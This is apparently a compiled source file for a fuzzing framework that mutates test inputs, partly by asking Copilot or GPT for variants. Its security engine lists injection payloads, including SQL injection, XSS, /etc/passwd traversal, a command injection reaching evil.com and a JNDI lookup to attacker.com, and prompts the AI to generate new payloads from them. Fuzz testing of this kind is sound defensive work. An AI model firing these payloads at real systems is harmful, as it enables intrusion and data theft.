"use strict";
/**
 * ===========================================================
 * MUTATION.TS
 * ===========================================================
 * Unified Dynamic Mutation Framework
 * - Adaptive fuzzing strategies (input, semantic, security)
 * - Copilot/GPT-assisted mutation engine
 * - Context-aware and self-learning via success feedback
 * ===========================================================
 */
Object.defineProperty(exports, "__esModule", { value: true });
exports.MutationRegistry = exports.MutationStrategies = exports.SecurityEngine = void 0;
const metrics_js_1 = require("../metrics/metrics.js");
// ===========================================================
// SECURITY ENGINE (dynamic payloads)
// ===========================================================
class SecurityEngine {
    constructor() {
        this.patterns = [
            { id: "sql_injection", template: "' OR '1'='1'; --", category: "injection", successRate: 1 },
            { id: "xss", template: "<script>alert('XSS')</script>", category: "injection", successRate: 1 },
            { id: "path_traversal", template: "../../etc/passwd", category: "bypass", successRate: 1 },
            { id: "command_injection", template: "&& ping -c 3 evil.com &&", category: "injection", successRate: 1 },
            { id: "jndi_exploit", template: "${jndi:ldap://attacker.com/exploit}", category: "serialization", successRate: 1 },
        ];
    }
    async applyDynamicPayload(input, ctx) {
        const chosen = this.pickWeightedPattern();
        let payload = chosen.template;
        // Use optimalAdaptationRate as probability threshold for dynamic generation
        const copilotThreshold = (0, metrics_js_1.optimalAdaptationRate)(this.patterns.length);
        if (ctx.copilotAdapter && Math.random() < copilotThreshold) {
            const prompt = `
Generate a new ${chosen.category} payload for ${ctx.language} (${ctx.domain}).
Base pattern: ${payload}
Last error: ${ctx.lastError || "none"}.
Keep same syntax, short output.`;
            try {
                const suggestion = await ctx.copilotAdapter.generateMutation(prompt);
                payload = suggestion.trim();
            }
            catch {
                /* fallback to static payload */
            }
        }
        return `${input}${payload}`;
    }
    updateSuccess(id, success) {
        const pattern = this.patterns.find((p) => p.id === id);
        // Use adaptationRate for update factor instead of hardcoded multipliers
        const updateFactor = (0, metrics_js_1.optimalAdaptationRate)(this.patterns.length);
        if (pattern)
            pattern.successRate *= success ? (1 + updateFactor) : (1 - updateFactor / 2);
    }
    pickWeightedPattern() {
        const total = this.patterns.reduce((sum, p) => sum + p.successRate, 0);
        let r = Math.random() * total;
        for (const p of this.patterns) {
            if ((r -= p.successRate) <= 0)
                return p;
        }
        return this.patterns[0];
    }
}
exports.SecurityEngine = SecurityEngine;
// ===========================================================
// BASE MUTATION STRATEGIES
// ===========================================================
const securityEngine = new SecurityEngine();
// Compute formal strategy probabilities based on optimal adaptation rate
// Total must sum to ~1.0 distributed across 5 strategies
const NUM_STRATEGIES = 5;
const baseRate = (0, metrics_js_1.optimalAdaptationRate)(NUM_STRATEGIES);
// Distribute probability: higher weight to boundary/security, lower to copilot/encoding
const probBoundary = baseRate * 2.5; // ~0.18 for dim=5
const probTypeFlip = baseRate * 1.5; // ~0.11
const probEncoding = baseRate * 1.5; // ~0.11
const probSecurity = baseRate * 2.5; // ~0.18
const probCopilot = baseRate * 1.5; // ~0.11
exports.MutationStrategies = [
    {
        id: "boundary_value",
        category: "input",
        description: "Boundary values and numeric edges",
        probability: probBoundary,
        apply: async (test) => {
            const values = ["0", "1", "-1", String(Number.MAX_SAFE_INTEGER), String(Number.MIN_SAFE_INTEGER)];
            return { ...test, input: values[Math.floor(Math.random() * values.length)] };
        },
    },
    {
        id: "type_flip",
        category: "semantic",
        description: "Change data type or logical inversion",
        probability: probTypeFlip,
        apply: async (test) => {
            const v = test.input;
            // Since input is now string, apply string mutations
            if (v === "true" || v === "false")
                return { ...test, input: v === "true" ? "false" : "true" };
            if (!isNaN(Number(v)))
                return { ...test, input: String(-Number(v)) };
            return { ...test, input: v.split("").reverse().join("") };
        },
    },
    {
        id: "encoding_mutation",
        category: "input",
        description: "Apply Unicode/base64/escaped encoding",
        probability: probEncoding,
        apply: async (test) => {
            const encoders = [
                (s) => Buffer.from(s).toString("base64"),
                (s) => encodeURIComponent(s),
                (s) => s.normalize("NFKD"),
            ];
            const fn = encoders[Math.floor(Math.random() * encoders.length)];
            return { ...test, input: fn(String(test.input)) };
        },
    },
    {
        id: "security_dynamic",
        category: "security",
        description: "Applies dynamic security payload (Copilot + weighted pattern)",
        probability: probSecurity,
        apply: async (test, ctx) => {
            const newInput = await securityEngine.applyDynamicPayload(String(test.input), ctx);
            // Don't change test name to avoid file duplication
            return { ...test, input: newInput };
        },
    },
    {
        id: "copilot_dynamic",
        category: "semantic",
        description: "Delegates mutation logic to Copilot or GPT",
        probability: probCopilot,
        apply: async (test, ctx) => {
            if (!ctx.copilotAdapter)
                return test;
            const prompt = `
You are a mutation generator improving test coverage.
Language: ${ctx.language}
Domain: ${ctx.domain}
Input: ${JSON.stringify(test.input)}
Generate a single mutated variant testing a new edge case.`;
            const suggestion = await ctx.copilotAdapter.generateMutation(prompt);
            return { ...test, input: suggestion.trim(), name: `${test.name}_copilot` };
        },
    },
];
// ===========================================================
// MUTATION REGISTRY
// ===========================================================
class MutationRegistry {
    constructor(domain = "backend") {
        this.domain = domain;
    }
    async applyRandomMutation(test, ctx) {
        const strategies = exports.MutationStrategies.filter((s) => this.domain === "backend" ? true : s.category !== "structural");
        const total = strategies.reduce((sum, s) => sum + s.probability, 0);
        const r = Math.random() * total;
        let acc = 0;
        for (const s of strategies) {
            acc += s.probability;
            if (r <= acc)
                return s.apply(test, ctx);
        }
        return test;
    }
    // Weight management (simple uniform if not yet adapted)
    getWeights() {
        const strategies = exports.MutationStrategies.filter(s => this.domain === 'backend' ? true : s.category !== 'structural');
        const uniform = 1 / strategies.length;
        const weights = {};
        for (const s of strategies)
            weights[s.id] = s.probability || uniform;
        return weights;
    }
    updateWeights(newWeights) {
        for (const strat of exports.MutationStrategies) {
            if (newWeights[strat.id] !== undefined) {
                strat.probability = newWeights[strat.id];
            }
        }
    }
}
exports.MutationRegistry = MutationRegistry;
//# sourceMappingURL=mutation.js.map